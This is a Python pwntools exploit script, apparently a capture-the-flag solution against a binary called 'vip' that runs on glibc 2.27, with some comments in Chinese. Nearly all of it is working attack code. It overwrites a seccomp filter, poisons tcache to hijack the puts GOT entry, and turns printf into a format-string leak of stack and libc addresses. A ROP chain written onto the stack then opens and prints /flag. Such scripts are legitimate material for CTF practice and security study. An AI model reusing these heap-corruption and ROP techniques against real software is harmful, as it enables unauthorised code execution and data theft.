#-*-coding:utf-8-*-
from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
p = process('./vip')
elf = ELF('vip')
libc = ELF('libc-2.27.so')

def Become(name, choice):
    p.recvuntil('Your choice: ')
    p.sendline('6')
    if choice == 1:
        p.recvuntil('your name: ')
    else:
        p.recvuntil('your name: \n')
    p.send(name)

def Add(index):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('Index: ', str(index))

def Edit(index, size, content):
    p.sendlineafter('Your choice: ', '4')
    p.sendlineafter('Index: ', str(index))
    p.sendlineafter('Size: ', str(size))
    p.sendafter('Content: ', content)

def Free(index):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('Index: ', str(index))

def Show(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('Index: ', str(index))

def Format(format__):
    p.sendafter('Your choice: ', format__)
    
#原长度为31个字节，在最后加一个字节，以便完全覆盖原来的数据
payload = '\x00'*0x20 + '\x20\x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x03\x3E\x00\x00\xC0\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x01\x00\x01\x01\x00\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x05\x00'
Become(payload, 0)

open_plt = elf.plt['open']
printf_plt = elf.plt['printf']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']
pop_ebp_ret = 0x4011d9
pop_rdi_ret = 0x4018fb
pop_rsi_r15_ret = 0x4018f9
pop_pop_pop = 0x4018f2
call_addr = 0x4018d8
read_got = elf.got['read']

Add(0)
Add(1)
Add(2)
Free(1)
Free(2)

payload = 'A'*0xc0
Edit(0, len(payload), payload)
Show(0)
p.recvuntil('A'*0xc0)
chunk_addr = u64(p.recvuntil('\n', drop = True).ljust(8, '\x00')) - 0x28 - 0x38
info("chunk_addr ==> "+hex(chunk_addr))

#复原chunk1，chunk2
payload = '/flag' + '\x00'*0x53 + p64(0x61) + p64(puts_got) + '\x00'*0x48 + p64(0x60) + p64(0x61) + p64(puts_got)
Edit(0, len(payload), payload)

#分配puts_got
Add(2)
Add(3)

#向puts_got中写入printf_plt
payload = p64(printf_plt)
Edit(3, len(payload), payload)

#泄漏stack地址
payload = '%8$p%17$p'
Edit(2, len(payload), payload)
Show(2)
stack_addr = int(p.recv(14), 16) - 0x38 + 0x40
info("stack_addr ==> " + hex(stack_addr))
libc_base = int(p.recv(14, 16), 16) - 0x21b97
info("libc_base ==> " + hex(libc_base))

#把stack_addr放入tcache_bin中
Free(2)
payload = '/flag' + '\x00'*0x53 + p64(0x61) + '\x00'*0x50 + p64(0x60) + p64(0x61) + p64(stack_addr)
#gdb.attach(p)
Edit(0, len(payload), payload)

#分配stack
Add(2)
Add(1)

pop_rdx_ret = libc_base + 0x1b96
syscall_addr = libc_base + 0x11b820 + 0x17
pop_rax_ret = libc_base + 0x439c8
pop_rbx_ret = libc_base + 0x2cb49
puts_addr = libc_base + libc.symbols['puts']

#构造ROP链
payload  = p64(pop_rdi_ret) + p64(chunk_addr) + p64(pop_rsi_r15_ret) + p64(0) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(pop_rax_ret) + p64(2) + p64(syscall_addr)
payload += p64(pop_pop_pop) + p64(0) + p64(1) + p64(read_got) + p64(3) + p64(chunk_addr) + p64(20)
payload += p64(call_addr) + '\x00'*56
payload += p64(pop_rdi_ret) + p64(chunk_addr) + p64(puts_addr)
Edit(1, len(payload), payload)

for i in range(4077):
    info("i ==> " + str(i))
    p.sendlineafter('Your choice: ', '7')
    p.sendlineafter('Index: ', '7')

p.interactive()

